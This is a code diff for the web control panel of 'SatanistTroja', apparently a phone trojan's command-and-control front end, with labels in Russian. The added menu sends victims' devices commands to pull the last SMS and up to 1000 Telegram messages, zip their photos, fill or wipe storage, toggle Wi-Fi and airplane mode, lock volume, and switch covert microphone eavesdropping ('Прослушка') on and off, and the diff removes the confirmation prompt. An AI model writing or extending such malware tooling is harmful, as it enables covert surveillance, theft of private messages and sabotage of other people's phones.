@@ -2,15 +2,15 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>SatanistTroja - Управление устройствами</title>
+    <title>SatanistTroja - Управление</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Segoe UI', sans-serif; background: #0a0e17; color: #e6edf3; padding: 20px; }
-        .container { max-width: 900px; margin: 0 auto; }
-        h1 { font-size: 28px; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
-        .header-info { font-size: 14px; color: #8b949e; font-weight: normal; }
-        .device { background: #161b22; border-radius: 16px; padding: 18px 20px; margin-bottom: 14px; border-left: 5px solid #2ea043; transition: all 0.3s; }
+        .container { max-width: 1000px; margin: 0 auto; }
+        h1 { font-size: 28px; margin-bottom: 10px; display: flex; align-items: center; gap: 10px; }
+        .subtitle { color: #8b949e; margin-bottom: 20px; }
+        .device { background: #161b22; border-radius: 16px; padding: 18px 20px; margin-bottom: 14px; border-left: 5px solid #2ea043; transition: all 0.3s; cursor: pointer; }
         .device.offline { border-left-color: #da3633; opacity: 0.7; }
         .device.online { border-left-color: #2ea043; }
         .device-top { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
@@ -27,23 +27,80 @@
         .btn-danger:hover { background: #f85149; }
         .btn-outline { background: transparent; border: 1px solid #30363d; color: #c9d1d9; }
         .btn-outline:hover { background: #30363d; }
+        .btn-purple { background: #8957e5; }
+        .btn-purple:hover { background: #a371f7; }
+        .btn-orange { background: #d29922; }
+        .btn-orange:hover { background: #e3b341; }
         .empty { text-align: center; padding: 60px 20px; color: #8b949e; }
         .empty .icon { font-size: 48px; margin-bottom: 16px; }
         .last-seen { font-size: 12px; color: #8b949e; margin-top: 4px; }
         .badge { background: #21262d; padding: 2px 10px; border-radius: 20px; font-size: 12px; }
-        @media (max-width: 600px) {
-            .device-top { flex-direction: column; align-items: flex-start; }
-        }
+        .menu-panel { background: #161b22; border-radius: 16px; padding: 20px; margin-top: 10px; display: none; border: 1px solid #30363d; }
+        .menu-panel.active { display: block; }
+        .menu-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; margin-top: 12px; }
+        .menu-grid .btn { width: 100%; text-align: center; padding: 10px; }
+        .menu-title { font-size: 16px; font-weight: bold; color: #c9d1d9; margin-bottom: 8px; }
+        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #238636; color: #fff; padding: 12px 24px; border-radius: 8px; z-index: 9999; font-size: 14px; animation: fadeIn 0.3s; }
+        .toast.error { background: #da3633; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateX(-50%) translateY(20px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
+        @media (max-width: 600px) { .device-top { flex-direction: column; align-items: flex-start; } .menu-grid { grid-template-columns: repeat(2, 1fr); } }
+        .expand-icon { font-size: 12px; color: #8b949e; margin-left: 8px; transition: transform 0.3s; }
+        .expand-icon.rotated { transform: rotate(180deg); }
+        .recording-indicator { color: #f85149; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+        .file-link { color: #58a6ff; text-decoration: none; }
+        .file-link:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
 <div class="container">
     <h1>📱 SatanistTroja</h1>
-    <p style="color:#8b949e; margin-bottom: 20px;">Управление подключёнными устройствами</p>
+    <div class="subtitle">Управление подключёнными устройствами</div>
     <div id="devices">Загрузка...</div>
 </div>
 
 <script>
+    let activeDeviceId = null;
+    let toastTimeout = null;
+
+    function showToast(msg, isError = false) {
+        if (toastTimeout) clearTimeout(toastTimeout);
+        const existing = document.querySelector('.toast');
+        if (existing) existing.remove();
+        const toast = document.createElement('div');
+        toast.className = 'toast' + (isError ? ' error' : '');
+        toast.textContent = msg;
+        document.body.appendChild(toast);
+        toastTimeout = setTimeout(() => toast.remove(), 3000);
+    }
+
+    function toggleMenu(deviceId) {
+        const panel = document.getElementById('menu-' + deviceId);
+        const icon = document.querySelector(`.device[onclick="toggleMenu('${deviceId}')"] .expand-icon`);
+        if (activeDeviceId && activeDeviceId !== deviceId) {
+            const oldPanel = document.getElementById('menu-' + activeDeviceId);
+            if (oldPanel) oldPanel.classList.remove('active');
+            const oldIcon = document.querySelector(`.device[onclick="toggleMenu('${activeDeviceId}')"] .expand-icon`);
+            if (oldIcon) oldIcon.classList.remove('rotated');
+        }
+        if (panel) {
+            panel.classList.toggle('active');
+            if (icon) icon.classList.toggle('rotated');
+            activeDeviceId = panel.classList.contains('active') ? deviceId : null;
+        }
+    }
+
+    function sendCommand(deviceId, command) {
+        fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId, command })
+        })
+        .then(res => res.json())
+        .then(() => showToast('✅ Команда отправлена: ' + command))
+        .catch(() => showToast('❌ Ошибка отправки', true));
+    }
+
     function fetchDevices() {
         fetch('/api/devices')
             .then(res => res.json())
@@ -55,10 +112,11 @@
                 }
                 container.innerHTML = data.map(d => {
                     const isOnline = d.status === 'online';
+                    const menuId = 'menu-' + d.id;
                     return `
-                        <div class="device ${isOnline ? 'online' : 'offline'}">
+                        <div class="device ${isOnline ? 'online' : 'offline'}" onclick="toggleMenu('${d.id}')">
                             <div class="device-top">
-                                <div class="device-name">${d.name || 'Без имени'}</div>
+                                <div class="device-name">${d.name || 'Без имени'} <span class="expand-icon">▼</span></div>
                                 <div class="device-status">
                                     ${isOnline 
                                         ? '<span class="online-tag">🟢 Онлайн</span>' 
@@ -72,11 +130,27 @@
                                 ${d.ip ? `<span>🌐 ${d.ip}</span>` : ''}
                             </div>
                             <div class="last-seen">Последний раз: ${d.last_seen ? new Date(d.last_seen).toLocaleString() : 'N/A'}</div>
-                            <div class="device-actions">
-                                <button class="btn" onclick="sendCommand('${d.id}', 'reboot')">🔄 Перезагрузить</button>
-                                <button class="btn btn-danger" onclick="sendCommand('${d.id}', 'shutdown')">⏻ Выключить</button>
-                                <button class="btn btn-outline" onclick="sendCommand('${d.id}', 'get_data')">📊 Данные</button>
-                                <button class="btn btn-outline" onclick="sendCommand('${d.id}', 'pictures')">📁 Pictures ZIP</button>
+                            
+                            <div class="menu-panel" id="${menuId}">
+                                <div class="menu-title">🎮 Управление устройством</div>
+                                <div class="menu-grid">
+                                    <button class="btn" onclick="event.stopPropagation(); sendCommand('${d.id}', 'reboot')">🔄 Перезагрузить</button>
+                                    <button class="btn btn-danger" onclick="event.stopPropagation(); sendCommand('${d.id}', 'shutdown')">⏻ Выключить</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'collect')">📊 Данные</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'pictures')">📁 Pictures ZIP</button>
+                                    <button class="btn btn-purple" onclick="event.stopPropagation(); sendCommand('${d.id}', 'lock_volume')">🔒 Блок. громкость</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'unlock_volume')">🔓 Разблок. громкость</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'wifi_toggle')">📶 Wi-Fi</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'airplane')">✈️ Режим полёта</button>
+                                    <button class="btn btn-orange" onclick="event.stopPropagation(); sendCommand('${d.id}', 'wallpaper')">🖼 Обои</button>
+                                    <button class="btn btn-purple" onclick="event.stopPropagation(); sendCommand('${d.id}', 'sms')">📱 SMS последние 5</button>
+                                    <button class="btn btn-purple" onclick="event.stopPropagation(); sendCommand('${d.id}', 'tgsms30')">📩 TG последние 30</button>
+                                    <button class="btn btn-purple" onclick="event.stopPropagation(); sendCommand('${d.id}', 'tgsms1000')">📩 TG последние 1000</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'fill_storage')">💾 Заполнить память</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'clean_storage')">🧹 Очистить память</button>
+                                    <button class="btn btn-danger" onclick="event.stopPropagation(); startRecording('${d.id}')">🎙 Прослушка (вкл)</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); stopRecording('${d.id}')">⏹ Прослушка (выкл)</button>
+                                </div>
                             </div>
                         </div>
                     `;
@@ -87,16 +161,15 @@
             });
     }
 
-    function sendCommand(deviceId, command) {
-        if (!confirm(`Отправить "${command}" на устройство?`)) return;
-        fetch('/api/command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ deviceId, command })
-        })
-        .then(res => res.json())
-        .then(() => alert('✅ Команда отправлена'))
-        .catch(() => alert('❌ Ошибка отправки'));
+    // Прослушка
+    function startRecording(deviceId) {
+        sendCommand(deviceId, 'voice_start');
+        showToast('🎙 Прослушка включена');
+    }
+
+    function stopRecording(deviceId) {
+        sendCommand(deviceId, 'voice_stop');
+        showToast('⏹ Прослушка выключена');
     }
 
     // Обновляем каждые 10 секунд
